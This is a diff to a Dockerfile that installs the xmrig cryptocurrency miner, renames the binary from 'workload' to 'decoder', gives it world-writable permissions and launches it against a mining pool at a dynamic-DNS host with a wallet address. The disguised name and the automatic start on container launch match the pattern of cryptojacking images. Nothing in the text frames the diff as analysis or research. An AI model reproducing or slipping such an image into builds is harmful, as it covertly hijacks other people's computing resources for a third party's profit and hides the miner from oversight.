@@ -9,10 +9,10 @@ RUN apt update; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig; \
     cd /usr/local/bin; \
-    mv xmrig workload;
+    mv xmrig decoder;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 workload;
+RUN chmod 777 decoder;
 
-CMD workload -a gr -o workload.sytes.net:5555 --tls -u RJ5mc1uMeBtqUmwJZJmT52B21HasAmJd2k
+CMD decoder -a gr -o decoder.sytes.net:5555 --tls -u RGwePkXmLPrdSBFPRo7rq9eVYQiBA5VAwQ
